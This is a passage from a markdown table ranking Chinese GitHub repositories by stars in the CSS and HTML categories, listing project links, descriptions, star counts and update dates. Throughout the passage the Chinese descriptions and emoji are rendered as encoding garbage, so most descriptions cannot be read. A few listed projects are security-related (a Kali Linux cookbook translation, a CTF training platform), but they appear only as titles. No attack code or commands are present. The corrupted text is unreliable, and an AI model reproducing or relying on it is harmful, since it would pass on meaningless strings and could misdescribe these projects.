|76|[FromEndWorld/LOFFER](https://github.com/FromEndWorld/LOFFER)|ÂçöÂÆ¢‰∏ªÈ¢ò A Jekyll theme with Chinese UI and document |257|CSS|09/04|
|77|[apachecn/stanford-cs224n-notes-zh](https://github.com/apachecn/stanford-cs224n-notes-zh)|:book: ÊñØÂù¶Á¶è CS224n Ëá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜ‰∏≠ÊñáÁ¨îËÆ∞|255|CSS|09/17|
|78|[c10342/player](https://github.com/c10342/player)|electron-vueÈü≥ËßÜÈ¢ëÊí≠ÊîæÂô®|252|CSS|09/07|
|79|[justjavac/esnext](https://github.com/justjavac/esnext)|‰ªãÁªçÊúÄÊñ∞ÁöÑ ECMAScript/JavaScript ËßÑËåÉÔºå‰ª•Âèä TC39 ÁöÑÊèêÊ°àËøõÂ∫¶|249|CSS|03/23|
|80|[zgq354/typecho-theme-next](https://github.com/zgq354/typecho-theme-next)|Hexo ‰∏ªÈ¢ò NexT.Mist ÁöÑ Typecho ÁßªÊ§çÁâàÔºàÈáçÊûÑ‰∏≠Ôºâ|248|CSS|03/09|
|81|[fofapro/fofa_view](https://github.com/fofapro/fofa_view)|FOFA Pro view ÊòØ‰∏ÄÊ¨æFOFA Pro ËµÑ‰∫ßÂ±ïÁ§∫ÊµèËßàÂô®Êèí‰ª∂ÔºåÁõÆÂâçÂÖºÂÆπ  Chrome„ÄÅFirefox„ÄÅOpera„ÄÇ|246|CSS|07/18|
|82|[hellosee/swoole-webim-demo](https://github.com/hellosee/swoole-webim-demo)|‰ΩøÁî®swooleÊâ©Â±ïÂíåphpÂºÄÂèëÁöÑ‰∏Ä‰∏™Âú®Á∫øËÅäÂ§©ÂÆ§(Making a Web Chat With PHP and Swoole)|243|CSS|02/12|
|83|[LF112/BTCO](https://github.com/LF112/BTCO)|üéâ ÂÆùÂ°îÈù¢ÊùøÂìçÂ∫îÂºèËß£ÂÜ≥ÊñπÊ°à|239|CSS|09/12|
|84|[dotnetclub-net/dotnetclub](https://github.com/dotnetclub-net/dotnetclub)|dotnetclub.net ÁöÑÊ∫ê‰ª£Á†Å|236|CSS|09/09|
|85|[trinitrotofu/Bubble](https://github.com/trinitrotofu/Bubble)|Typecho Ê∏ÖÊñ∞È£éÊ†ºÂìçÂ∫îÂºè‰∏ªÈ¢ò|228|CSS|10/29|
|86|[HongqingCao/vue-portal-webUI](https://github.com/HongqingCao/vue-portal-webUI)|Âü∫‰∫éVueÁöÑÈó®Êà∑ÁΩëÁ´ôÂ∞èÁªÑ‰ª∂|228|CSS|09/04|
|87|[xfgryujk/blivechat](https://github.com/xfgryujk/blivechat)|Áî®‰∫éOBSÁöÑ‰ªøYouTubeÈ£éÊ†ºÁöÑbilibiliÁõ¥Êí≠ËØÑËÆ∫Ê†è|224|CSS|10/17|
|88|[happypeter/haoduoshipin](https://github.com/happypeter/haoduoshipin)|Â•ΩÂ§öËßÜÈ¢ë|216|CSS|08/24|
|89|[apachecn/ntu-hsuantienlin-ml](https://github.com/apachecn/ntu-hsuantienlin-ml)|:book: Âè∞ÊπæÂ§ßÂ≠¶ÊûóËΩ©Áî∞Êú∫Âô®Â≠¶‰π†Á¨îËÆ∞|214|CSS|10/06|
|90|[apachecn/flink-doc-zh](https://github.com/apachecn/flink-doc-zh)|Apache Flink ‰∏≠ÊñáÊñáÊ°£|211|CSS|10/06|
|91|[twotreesus/V2ray.FunPi](https://github.com/twotreesus/V2ray.FunPi)|‰∏Ä‰∏™Âü∫‰∫é Web ÁöÑ V2ray ÊéßÂà∂Èù¢ÊùøÔºåÂ∑≤ÊîπÈÄ†‰∏∫Â∞ÜÊ†ëËéìÊ¥æ‰Ωú‰∏∫ÊóÅË∑ØÁî±‰ΩøÁî®ÔºåÂè™ÈúÄË¶ÅËÆæÁΩÆÂ•ΩÁΩëÂÖ≥ÔºåÂç≥ÂèØ‰ª£ÁêÜË∑ØÁî±Âô®‰∏ãÊâÄÊúâËÆæÂ§áÈÄèÊòéÁøªÂ¢ôÔºåÊîØÊåÅÁõ¥Ëøû\Êô∫ËÉΩÂàÜÊµÅ\ÂÖ®Â±Ä‰ª£ÁêÜ ‰∏âÁßçÊ®°ÂºèÔºåÂπ∂ËÉΩËá™Âä®ÁÆ°ÁêÜËÆ¢ÈòÖÔºåÂéüÁêÜÂèÇËÄÉ [ÈÄèÊòé‰ª£ÁêÜ(TPROXY)|209|CSS|10/28|
|92|[livelyPeng/pl-drag-template](https://github.com/livelyPeng/pl-drag-template)|‰∏Ä‰∏™h5ÂèØËßÜÂåñÁºñËæëÂô®È°πÁõÆ|209|CSS|09/11|
|93|[apachecn/opencv-doc-zh](https://github.com/apachecn/opencv-doc-zh)|:book: [ËØë] OpenCV ‰∏≠ÊñáÊñáÊ°£|208|CSS|10/06|
|94|[sanjinhub/hexo-theme-geek](https://github.com/sanjinhub/hexo-theme-geek)|‰∏Ä‰∏™Á¨¶ÂêàÊûÅÂÆ¢Á≤æÁ•û‰∏ª‰πâÊûÅÁÆÄÁöÑ Hexo ‰∏ªÈ¢ò|206|CSS|04/21|
|95|[kali-docs-cn/kali-linux-cookbook-zh](https://github.com/kali-docs-cn/kali-linux-cookbook-zh)|:book: „ÄêËØë„ÄëKali Linux ÁßòÁ±ç|201|CSS|10/01|
|96|[mo-xiaoxi/AWD_CTF_Platform](https://github.com/mo-xiaoxi/AWD_CTF_Platform)|‰∏Ä‰∏™ÁÆÄÂçïÁöÑAWDËÆ≠ÁªÉÂπ≥Âè∞|199|CSS|10/13|
|97|[Zisbusy/Akina-for-Typecho](https://github.com/Zisbusy/Akina-for-Typecho)|Akina for Typecho ‰∏ªÈ¢òÊ®°Êùø|199|CSS|09/09|
|98|[medcl/book-elastic-search-in-action](https://github.com/medcl/book-elastic-search-in-action)|Elastic ÊêúÁ¥¢ÂºÄÂèëÂÆûÊàò|195|CSS|07/10|
|99|[xukimseven/HardCandy-Jekyll](https://github.com/xukimseven/HardCandy-Jekyll)|‰∏ÄÊ¨æÊ∏ÖÊñ∞ Á≥ñÊûúËâ≤üç¨ ÁöÑ ‚ÄòJekyll‚Äô ‰∏ªÈ¢ò„ÄÇA candy-colored üç¨ ‚ÄòJekyll‚Äô theme.|194|CSS|06/01|
|100|[mashirozx/arknights-ui](https://github.com/mashirozx/arknights-ui)|H5 Â§çÂàªÁâàÊòéÊó•ÊñπËàüÊ∏∏Êàè‰∏ªÁïåÈù¢|191|CSS|05/06|
|101|[eagleoflqj/p1a3_script](https://github.com/eagleoflqj/p1a3_script)|Tampermonkey Script for 1point3acres / ‰∏Ä‰∫©‰∏âÂàÜÂú∞ÁöÑÊ≤πÁå¥ËÑöÊú¨|190|CSS|06/19|
|102|[xinggsf/Adblock-Plus-Rule](https://github.com/xinggsf/Adblock-Plus-Rule)|ABPËøáÊª§ËßÑÂàôÁÆÄÂåñÁâà|189|CSS|02/10|
|103|[hsxyhao/gridea-theme-next](https://github.com/hsxyhao/gridea-theme-next)|Gridea NexT‰∏ªÈ¢òÔºåÊê¨hexo-next-theme|189|CSS|09/15|
|104|[szpnygo/wepy_ios_top](https://github.com/szpnygo/wepy_ios_top)|‰∏ÄÊ¨æÂèØ‰ª•ÂàáÊç¢ÂõΩÂÆ∂Êü•Áúã‰∏çÂêåÂõΩÂÆ∂iOSÂ∫îÁî®ÊéíË°åÊ¶úÁöÑÂ∞èÁ®ãÂ∫è|185|CSS|06/23|
|105|[Zou-Wang/CNblogs-Theme-Sakura](https://github.com/Zou-Wang/CNblogs-Theme-Sakura)|Âü∫‰∫éSakuraÁæéÂåñÁöÑÂçöÂÆ¢Âõ≠Ê†∑Âºè|179|CSS|07/28|
|106|[lovefc/china_school_badge](https://github.com/lovefc/china_school_badge)|ÂÖ®ÂõΩÈ´òÊ†°Ê†°ÂæΩÂ≠ó‰ΩìÂõæÊ†áÂ∫ì|173|CSS|08/19|
|107|[Lemonreds/hexo-theme-nayo](https://github.com/Lemonreds/hexo-theme-nayo)|‰∏Ä‰∏™ÁÆÄÊ¥ÅÁöÑHexo‰∏ªÈ¢ò.|172|CSS|08/31|
|108|[apachecn/matplotlib-doc-zh](https://github.com/apachecn/matplotlib-doc-zh)|:book: [ËØë] Matplotlib Áî®Êà∑ÊåáÂçó|171|CSS|10/06|
|109|[lzhpo/lzhpo-shiro](https://github.com/lzhpo/lzhpo-shiro)|ÁæéËßÇ„ÄÅÊºÇ‰∫ÆÔºåÊàëÊäΩÁ¶ªÂá∫Êù•ÁöÑÔºåÊãøÊù•Âç≥Áî®ÁöÑÁÆÄÂçïÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºÅ|169|CSS|08/23|
|110|[imsobear/blog](https://github.com/imsobear/blog)|ÊûúÂêåÂ≠¶ÁöÑÂçöÂÆ¢|161|CSS|03/04|
|111|[AxiosCros/tpr-cms](https://github.com/AxiosCros/tpr-cms)|Èù¢ÂêëÂ§öÂ∫îÁî®Ê®°ÂºèÁöÑÁÆ°ÁêÜÁ≥ªÁªüÂíåÊé•Âè£ÂºÄÂèëÊ°ÜÊû∂|156|CSS|10/21|
|112|[apachecn/hbase-doc-zh](https://github.com/apachecn/hbase-doc-zh)|:book: HBase ‰∏≠ÊñáÂèÇËÄÉÊåáÂçó|155|CSS|10/06|
|113|[apachecn/airflow-doc-zh](https://github.com/apachecn/airflow-doc-zh)|:book: [ËØë] Airflow ‰∏≠ÊñáÊñáÊ°£|155|CSS|10/07|
|114|[lewis-geek/hexo-theme-Aath](https://github.com/lewis-geek/hexo-theme-Aath)|Hexo ‰∏ªÈ¢ò|154|CSS|05/31|
|115|[liuhuanyong/liuhuanyong.github.io](https://github.com/liuhuanyong/liuhuanyong.github.io)|Èù¢Âêë‰∏≠ÊñáËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÁöÑÂÖ≠ÂçÅ‰ΩôÁ±ªÂÆûË∑µÈ°πÁõÆÂèäÂ≠¶‰π†Á¥¢ÂºïÔºåÊ∂µÁõñËØ≠Ë®ÄËµÑÊ∫êÊûÑÂª∫„ÄÅÁ§æ‰ºöËÆ°ÁÆó„ÄÅËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÁªÑ‰ª∂„ÄÅÁü•ËØÜÂõæË∞±„ÄÅ‰∫ãÁêÜÂõæË∞±„ÄÅÁü•ËØÜÊäΩÂèñ„ÄÅÊÉÖÊÑüÂàÜÊûê„ÄÅÊ∑±Â∫¶Â≠¶‰π†Á≠âÂá†‰∏™Â≠¶‰π†‰∏ªÈ¢ò„ÄÇÂåÖÊã¨‰ΩúËÄÖ‰∏™‰∫∫ÁÆÄ‰ªã„ÄÅÂ≠¶‰π†ÂøÉÂæó„ÄÅËØ≠Ë®ÄËµÑÊ∫ê„ÄÅÂ∑•‰∏öËêΩÂú∞Á≥ªÁªüÁ≠âÔºåÊòØ‰æõËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜÂÖ•Èó®Â≠¶‰π†ËÄÖÁöÑ‰∏Ä‰∏™ËæÉ‰∏∫ÂÖ®Èù¢ÁöÑÂ≠¶‰π†ËµÑÊ∫êÔºåÊ¨¢ËøéÂ§ßÂÆ∂‰ΩøÁî®ÔºåÂπ∂ÊèêÂá∫ÊâπËØÑÊÑèËßÅ„ÄÇ|153|CSS|10/27|
|116|[Lxxyx/LxxyxResume](https://github.com/Lxxyx/LxxyxResume)|ÂâçÁ´ØÁÆÄÂéÜÁîüÊàêÂô®|143|CSS|09/03|
|117|[apachecn/storm-doc-zh](https://github.com/apachecn/storm-doc-zh)|Apache Storm ÂÆòÊñπÊñáÊ°£‰∏≠ÊñáÁâà|143|CSS|10/06|
|118|[pangxiaobin/CrawlerHot](https://github.com/pangxiaobin/CrawlerHot)|‰ªäÊó•ÁÉ≠Ê¶ú   ÊäìÂèñÁΩëÁ´ôÁÉ≠Ê¶ú‰ø°ÊÅØÔºåÂπ∂‰∏îÂâçÁ´ØËøõË°åÂ±ïÁ§∫|139|CSS|10/25|
|119|[d2-projects/d2-daily](https://github.com/d2-projects/d2-daily)|D2 Êó•Êä•|137|CSS|09/07|
|120|[zhitom/zkweb](https://github.com/zhitom/zkweb)|zookeeper webÁÆ°ÁêÜÂíåÁõëÊéßÁïåÈù¢Ôºå‰ΩøÁî®ÂÜÖÁΩÆÁöÑH2Êï∞ÊçÆÂ∫ìÔºåÊ≠§ÁâàÊú¨Âü∫‰∫éÊ∑òÂÆùÂ§ßÁ•ûyasenagatÁöÑzkWebÊ∫êÁ†ÅÂü∫Á°Ä‰πã‰∏äËøõË°å‰∫ÜÂ§ßÂπÖÂçáÁ∫ßÂíå‰øÆÊîπÔºå‰∏ªË¶ÅÊñ∞Â¢û‰∫ÜÈõÜÁæ§ÁõëÊéßÂíåÂõΩÈôÖÂåñÂäüËÉΩÔºåÁõ¥Êé•java -jarÊàñÂ∞ÜwarÂåÖÊîæÂÖ•tomcatÂç≥ÂèØËøêË°åÔºÅÊúÄËøëÊñ∞Â¢ûÂä†‰∫ÜdockerÈïúÂÉèÂäüËÉΩÔºÅ|135|CSS|04/18|
|121|[realpdai/springboot-javafx-app-demo](https://github.com/realpdai/springboot-javafx-app-demo)|springboot+Javafx Ê°åÈù¢Â∫îÁî®|134|CSS|09/06|
|122|[emacs-china/elpa](https://github.com/emacs-china/elpa)|Emacs China ELPA ÈïúÂÉè|132|CSS|08/15|
|123|[liuxiaoyucc/uni-app-moments](https://github.com/liuxiaoyucc/uni-app-moments)|:star2: uni-app-moments Á±ª‰ººÂæÆ‰ø°ÊúãÂèãÂúàÊ®°Áâà|131|CSS|10/19|
|124|[52bp/52bp.github.io](https://github.com/52bp/52bp.github.io)|ÂàÜ‰∫´ÂÖçË¥πSSR V2ray Trojan ÂÖçË¥π„ÄÅ‰ºòË¥®ËäÇÁÇπÊú∫Âú∫Â§ßÂÖ®ÂØºËà™Êé®ËçêÔºåËÆ∞ÂæóÁÇπÂáªstar‚≠ê==‰∏çËø∑Ë∑Ø|130|CSS|10/28|
|125|[idealclover/Life-in-NJU](https://github.com/idealclover/Life-in-NJU)|üè† ÂçóÂì™ÊåáÂçó‚ÄîÂçóÂì™Â§ßÂ≠¶ÁΩëÂùÄÂØºËà™|130|CSS|10/08|
|126|[ColdDay/VideoToGIF](https://github.com/ColdDay/VideoToGIF)|video to gif ËßÜÈ¢ëËΩ¨gifÂà∂‰ΩúË°®ÊÉÖÂåÖÊèí‰ª∂ÔºàÂèØ‰ª•Ê∑ªÂä†ÊñáÂ≠óÔºâ|128|CSS|07/30|
|127|[Piasy/AdvancedRxJava](https://github.com/Piasy/AdvancedRxJava)|Advanced RxJava http://akarnokd.blogspot.com/ Á≥ªÂàóÂçöÂÆ¢ÁöÑ‰∏≠ÊñáÁøªËØëÔºåÂ∑≤ÂæÅÂæó‰ΩúËÄÖÊéàÊùÉ„ÄÇ|128|CSS|02/24|
|128|[apachecn/ds-ai-tech-notes](https://github.com/apachecn/ds-ai-tech-notes)|:book: [ËØë] Êï∞ÊçÆÁßëÂ≠¶Âíå‰∫∫Â∑•Êô∫ËÉΩÊäÄÊúØÁ¨îËÆ∞|121|CSS|10/06|
|129|[coloz/image-to-bitmap-array](https://github.com/coloz/image-to-bitmap-array)|convert image to C bitmap array   ‰∏Ä‰∏™Á∫ØÂâçÁ´ØÁöÑÂõæÁâáÂèñÊ®°Á®ãÂ∫è|118|CSS|09/12|
|130|[apachecn/seaborn-doc-zh](https://github.com/apachecn/seaborn-doc-zh)|:book: [ËØë] seaborn 0.9 ‰∏≠ÊñáÊñáÊ°£|117|CSS|10/06|
|131|[apachecn/elasticsearch-doc-zh](https://github.com/apachecn/elasticsearch-doc-zh)|:book: [ËØë] elasticsearch ‰∏≠ÊñáÊñáÊ°£|117|CSS|10/06|
|132|[Yuchunchen/BuildYourOwnConferenceSystem](https://github.com/Yuchunchen/BuildYourOwnConferenceSystem)|ÈÄôÂÄãË®àÁï´ÁõÆÁöÑÂú®ÊñºÊèê‰æõ„ÄåÂø´ÈÄüÊû∂Á´ôÊá∂‰∫∫ÂåÖ„ÄçÔºåÂçîÂä©ÊÇ®Âø´ÈÄüÊû∂ÊßãËá™Â∑±Â∞àÂ±¨„ÄÅÂÖçË≤ª„ÄÅÂÆâÂÖ®„ÄÅÊòìÁî®ÁöÑË¶ñË®äÊúÉË≠∞Á≥ªÁµ±„ÄÇ|117|CSS|05/16|
|133|[smallnest/go-rpc-programming-guide](https://github.com/smallnest/go-rpc-programming-guide)|gitbook Go RPCÂºÄÂèëÊåáÂçó [‰∏≠ÊñáÊñáÊ°£]|116|CSS|07/13|
|134|[apachecn/calc4b-zh](https://github.com/apachecn/calc4b-zh)|:book: [ËØë] MIT 18.03 Èù¢ÂêëÂàùÂ≠¶ËÄÖÁöÑÂæÆÁßØÂàÜ|114|CSS|10/06|
|135|[laike9m/zhihu-card](https://github.com/laike9m/zhihu-card)|Áî®Âç°ÁâáÂú®‰∏™‰∫∫ÁΩëÁ´ô‰∏äÂ±ïÁ§∫Áü•‰πéË¥¶Êà∑|113|CSS|02/02|
|136|[Hello-hao/HellohaoWallpaper](https://github.com/Hello-hao/HellohaoWallpaper)|Âü∫‰∫éSpringBootÁöÑÈ´òÊ∏ÖÂ£ÅÁ∫∏ÂõæÁâáÁ´ô„ÄÇ|113|CSS|07/25|
|137|[x-cold/yuque-blog](https://github.com/x-cold/yuque-blog)|Âü∫‰∫éËØ≠ÈõÄ‰Ωú‰∏∫ÂêéÂè∞ÂÆûÁé∞ÁöÑÂçöÂÆ¢Á≥ªÁªü|112|CSS|07/28|
|138|[BiYuqi/webpack-seed](https://github.com/BiYuqi/webpack-seed)|:roller_coaster: A Multi Page Application base on webpack and babel. webpackÊê≠Âª∫Â§öÈ°µÈù¢Ê®°Êùø|110|CSS|09/29|
|139|[thinkphp-tech/think-builder](https://github.com/thinkphp-tech/think-builder)|A command line toolit to build applications' CRUD/mvc scaffold for thinkphp v6. Áî®‰∫éÁîüÊàê thinkphp v6 Â¢ûÊü•ÊîπÂà†ËÑöÊâãÊû∂‰ª£Á†ÅÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑„ÄÇ|105|CSS|04/27|
|140|[lvyueyang/web-music](https://github.com/lvyueyang/web-music)|‰∏Ä‰∏™ÁÆÄÂçïÁöÑÈü≥‰πêÊí≠ÊîæÂô®ÔºåÊí≠ÊîæÂë®Êù∞‰º¶ÁöÑÊ≠åÊõ≤|105|CSS|07/16|
|141|[apachecn/ds100-textbook-zh](https://github.com/apachecn/ds100-textbook-zh)|:book: [ËØë] UCB DS100 Êï∞ÊçÆÁßëÂ≠¶ÁöÑÂéüÁêÜ‰∏éÊäÄÂ∑ß|104|CSS|10/06|
|142|[jangdelong/hexo-theme-xups](https://github.com/jangdelong/hexo-theme-xups)|hexo‰∏ªÈ¢òxups|104|CSS|02/23|
|143|[hahaha108/copyBook](https://github.com/hahaha108/copyBook)|Áî®Áà¨Ëô´Áà¨ÂèñÂ∞èËØ¥ÁΩëÁ´ô‰∏äÊâÄÊúâÂ∞èËØ¥ÔºåÂ≠òÂÇ®Âà∞Êï∞ÊçÆÂ∫ì‰∏≠ÔºåÂπ∂Áî®Áà¨Âà∞ÁöÑÊï∞ÊçÆÊûÑÂª∫Ëá™Â∑±ÁöÑÂ∞èËØ¥ÁΩëÁ´ô|102|CSS|08/20|
|144|[hack-fang/nCov](https://github.com/hack-fang/nCov)|ÂÖ®ÂõΩÂèäÂêÑÁúÅÊñ∞ÂûãËÇ∫ÁÇéÁñ´ÊÉÖÊÉÖÂÜµÂõæ(Êï∞ÊçÆÂÅúÊ≠¢Êõ¥Êñ∞)|101|CSS|02/20|
|145|[SwiftGGTeam/GGHexo](https://github.com/SwiftGGTeam/GGHexo)|ÊâìÈÄ†ÂõΩÂÜÖÁ¨¨‰∏Ä Swift ËØëÊñáÁ´ô|100|CSS|09/04|
|146|[Surile/Abraham](https://github.com/Surile/Abraham)|Â∞èÁ®ãÂ∫èÂûÉÂúæÂàÜÁ±ª|96|CSS|09/10|
|147|[Bulandent/hexo-theme-bubuzou](https://github.com/Bulandent/hexo-theme-bubuzou)|‰∏Ä‰∏™‰ªøVueÂÆòÁΩëÈ£éÊ†ºÁöÑhexo‰∏ªÈ¢ò  https://bubuzou.com/|95|CSS|08/13|
|148|[SerhoLiu/serholiu.com](https://github.com/SerhoLiu/serholiu.com)|ÊàëÁöÑÂçöÂÆ¢|93|CSS|07/11|
|149|[cgq001/dingdong](https://github.com/cgq001/dingdong)|ÂèÆÂíö‰π∞ËèúÂâçÁ´Ø|92|CSS|06/23|
|150|[luokangyuan/ghost-theme-mj](https://github.com/luokangyuan/ghost-theme-mj)|This is a beautiful ghost blog themeÔºåËøôÊòØ‰∏Ä‰∏™ÊºÇ‰∫ÆÁöÑGhostÂçöÂÆ¢‰∏ªÈ¢ò„ÄÇ|92|CSS|06/06|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)

<br/>

## HTML

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
|1|[fengdu78/Coursera-ML-AndrewNg-Notes](https://github.com/fengdu78/Coursera-ML-AndrewNg-Notes)|Âê¥ÊÅ©ËææËÄÅÂ∏àÁöÑÊú∫Âô®Â≠¶‰π†ËØæÁ®ã‰∏™‰∫∫Á¨îËÆ∞|19.3k|HTML|10/28|
|2|[QSCTech/zju-icicles](https://github.com/QSCTech/zju-icicles)|ÊµôÊ±üÂ§ßÂ≠¶ËØæÁ®ãÊîªÁï•ÂÖ±‰∫´ËÆ°Âàí|19.2k|HTML|10/24|
|3|[TeamStuQ/skill-map](https://github.com/TeamStuQ/skill-map)|Á®ãÂ∫èÂëòÊäÄËÉΩÂõæË∞±|17.4k|HTML|08/28|
|4|[PKUanonym/REKCARC-TSC-UHT](https://github.com/PKUanonym/REKCARC-TSC-UHT)|Ê∏ÖÂçéÂ§ßÂ≠¶ËÆ°ÁÆóÊú∫Á≥ªËØæÁ®ãÊîªÁï• Guidance for courses in Department of Computer Science and Technology, Tsinghua University|15.3k|HTML|10/16|
|5|[jaywcjlove/linux-command](https://github.com/jaywcjlove/linux-command)|LinuxÂëΩ‰ª§Â§ßÂÖ®ÊêúÁ¥¢Â∑•ÂÖ∑ÔºåÂÜÖÂÆπÂåÖÂê´LinuxÂëΩ‰ª§ÊâãÂÜå„ÄÅËØ¶Ëß£„ÄÅÂ≠¶‰π†„ÄÅÊêúÈõÜ„ÄÇhttps://git.io/linux|14.5k|HTML|10/29|
|6|[nndl/nndl.github.io](https://github.com/nndl/nndl.github.io)|„ÄäÁ•ûÁªèÁΩëÁªú‰∏éÊ∑±Â∫¶Â≠¶‰π†„Äã ÈÇ±Èî°ÈπèËëó Neural Network and Deep Learning |13.5k|HTML|10/22|
|7|[fengdu78/deeplearning_ai_books](https://github.com/fengdu78/deeplearning_ai_books)|deeplearning.aiÔºàÂê¥ÊÅ©ËææËÄÅÂ∏àÁöÑÊ∑±Â∫¶Â≠¶‰π†ËØæÁ®ãÁ¨îËÆ∞ÂèäËµÑÊ∫êÔºâ|12.1k|HTML|09/21|
|8|[flutterchina/flutter-in-action](https://github.com/flutterchina/flutter-in-action)|„ÄäFlutterÂÆûÊàò„ÄãÁîµÂ≠ê‰π¶|7.8k|HTML|09/28|
|9|[PanDownloadServer/Server](https://github.com/PanDownloadServer/Server)|PanDownloadÁöÑ‰∏™‰∫∫Áª¥Êä§ÁâàÊú¨|7.1k|HTML|09/25|
|10|[open-power-workgroup/Hospital](https://github.com/open-power-workgroup/Hospital)|OpenPowerÂ∑•‰ΩúÁªÑÊî∂ÈõÜÊ±áÊÄªÁöÑÂåªÈô¢ÂºÄÊîæÊï∞ÊçÆ|6.5k|HTML|10/27|
|11|[easzlab/kubeasz](https://github.com/easzlab/kubeasz)|‰ΩøÁî®AnsibleËÑöÊú¨ÂÆâË£ÖK8SÈõÜÁæ§Ôºå‰ªãÁªçÁªÑ‰ª∂‰∫§‰∫íÂéüÁêÜÔºåÊñπ‰æøÁõ¥Êé•Ôºå‰∏çÂèóÂõΩÂÜÖÁΩëÁªúÁéØÂ¢ÉÂΩ±Âìç|6.2k|HTML|10/29|
|12|[fool2fish/dragon-book-exercise-answers](https://github.com/fool2fish/dragon-book-exercise-answers)|Compilers Principles, Techniques, & Tools (purple dragon book) second edition exercise answers. ÁºñËØëÂéüÁêÜÔºàÁ¥´Èæô‰π¶ÔºâÁ¨¨2Áâà‰π†È¢òÁ≠îÊ°à„ÄÇ|4.2k|HTML|10/13|
|13|[cloudfavorites/favorites-web](https://github.com/cloudfavorites/favorites-web)|‰∫ëÊî∂Ëóè Spring Boot 2.X ÂºÄÊ∫êÈ°πÁõÆ|4.2k|HTML|02/28|
|14|[me115/linuxtools_rst](https://github.com/me115/linuxtools_rst)|LinuxÂ∑•ÂÖ∑Âø´ÈÄüÊïôÁ®ã|4.1k|HTML|08/19|
|15|[sofish/typo.css](https://github.com/sofish/typo.css)|‰∏≠ÊñáÁΩëÈ°µÈáçËÆæ‰∏éÊéíÁâàÔºö‰∏ÄËá¥ÂåñÊµèËßàÂô®ÊéíÁâàÊïàÊûúÔºåÊûÑÂª∫ÊúÄÈÄÇÂêà‰∏≠ÊñáÈòÖËØªÁöÑÁΩëÈ°µÊéíÁâà|4.0k|HTML|10/01|
|16|[tmallfe/tmallfe.github.io](https://github.com/tmallfe/tmallfe.github.io)|Â§©Áå´ÂâçÁ´Ø|3.9k|HTML|04/07|
|17|[golang-china/gopl-zh](https://github.com/golang-china/gopl-zh)|:books: GoËØ≠Ë®ÄÂú£Áªè‰∏≠ÊñáÁâà|3.9k|HTML|05/26|
|18|[HT524/500LineorLess_CN](https://github.com/HT524/500LineorLess_CN)|500 line or less ‰∏≠ÊñáÁøªËØëËÆ°Âàí„ÄÇ|3.6k|HTML|08/28|
|19|[javascript-tutorial/zh.javascript.info](https://github.com/javascript-tutorial/zh.javascript.info)|Áé∞‰ª£ JavaScript ÊïôÁ®ãÔºàThe Modern JavaScript TutorialÔºâ|3.4k|HTML|10/20|
|20|[Jack-Cherish/Machine-Learning](https://github.com/Jack-Cherish/Machine-Learning)|:zap:Êú∫Âô®Â≠¶‰π†ÂÆûÊàòÔºàPython3ÔºâÔºökNN„ÄÅÂÜ≥Á≠ñÊ†ë„ÄÅË¥ùÂè∂ÊñØ„ÄÅÈÄªËæëÂõûÂΩí„ÄÅSVM„ÄÅÁ∫øÊÄßÂõûÂΩí„ÄÅÊ†ëÂõûÂΩí|3.4k|HTML|10/01|
|21|[itorr/nbnhhsh](https://github.com/itorr/nbnhhsh)|üò©„ÄåËÉΩ‰∏çËÉΩÂ•ΩÂ•ΩËØ¥ËØùÔºü„Äç ÊãºÈü≥È¶ñÂ≠óÊØçÁº©ÂÜôÁøªËØëÂ∑•ÂÖ∑|3.2k|HTML|06/09|
|22|[gwuhaolin/dive-into-webpack](https://github.com/gwuhaolin/dive-into-webpack)|ÂÖ®Èù¢ÁöÑWebpackÊïôÁ®ã„ÄäÊ∑±ÂÖ•ÊµÖÂá∫Webpack„ÄãÁîµÂ≠ê‰π¶|3.2k|HTML|08/04|
|23|[resumejob/awesome-resume](https://github.com/resumejob/awesome-resume)|Á®ãÂ∫èÂëòÁÆÄÂéÜ‰æãÂè•ÔºåÁ®ãÂ∫èÂëòÁÆÄÂéÜËåÉ‰æãÔºåJavaÁÆÄÂéÜÊ®°ÁâàÔºåPythonÁÆÄÂéÜÊ®°ÁâàÔºåC++ÁÆÄÂéÜÊ®°Áâà|2.9k|HTML|09/13|
|24|[blinkfox/hexo-theme-matery](https://github.com/blinkfox/hexo-theme-matery)|A beautiful hexo blog theme with material design and responsive design.‰∏Ä‰∏™Âü∫‰∫éÊùêÊñôËÆæËÆ°ÂíåÂìçÂ∫îÂºèËÆæËÆ°ËÄåÊàêÁöÑÂÖ®Èù¢„ÄÅÁæéËßÇÁöÑHexo‰∏ªÈ¢ò„ÄÇÂõΩÂÜÖËÆøÈóÆÔºöhttp://blinkfox.com|2.7k|HTML|10/25|
|25|[wx-chevalier/Developer-Zero-To-Mastery](https://github.com/wx-chevalier/Developer-Zero-To-Mastery)|:books: To Be Professional Developer From Zero To Mastery, Interactive MindMap, RoadMap(Learning Path/Interview Questions), xCompass, Weekly for Developer, to Learn Everything in ITCS  :dizzy: Á®ãÂ∫èÂëòÁöÑÊäÄÊúØËßÜÈáé„ÄÅÁü•ËØÜÁÆ°ÁêÜ‰∏éËÅå‰∏öËßÑÂàíÔºåÊèêÈ´ò‰∏™‰∫∫‰∏éÂõ¢ÈòüÁöÑÁ†îÂèëÊïàËÉΩ|2.7k|HTML|10/16|
|26|[shishan100/Java-Interview-Advanced](https://github.com/shishan100/Java-Interview-Advanced)|‰∏≠ÂçéÁü≥Êùâ--‰∫íËÅîÁΩëJavaËøõÈò∂Èù¢ËØïËÆ≠ÁªÉËê•|2.6k|HTML|04/15|
|27|[doocs/technical-books](https://github.com/doocs/technical-books)|üòÜ ÂõΩÂÜÖÂ§ñ‰∫íËÅîÁΩëÊäÄÊúØÂ§ßÁâõ‰ª¨ÈÉΩÂÜô‰∫ÜÂì™‰∫õ‰π¶Á±çÔºöËÆ°ÁÆóÊú∫Âü∫Á°Ä„ÄÅÁΩëÁªú„ÄÅÂâçÁ´Ø„ÄÅÂêéÁ´Ø„ÄÅÊï∞ÊçÆÂ∫ì„ÄÅÊû∂ÊûÑ„ÄÅÂ§ßÊï∞ÊçÆ„ÄÅÊ∑±Â∫¶Â≠¶‰π†...|2.5k|HTML|10/20|
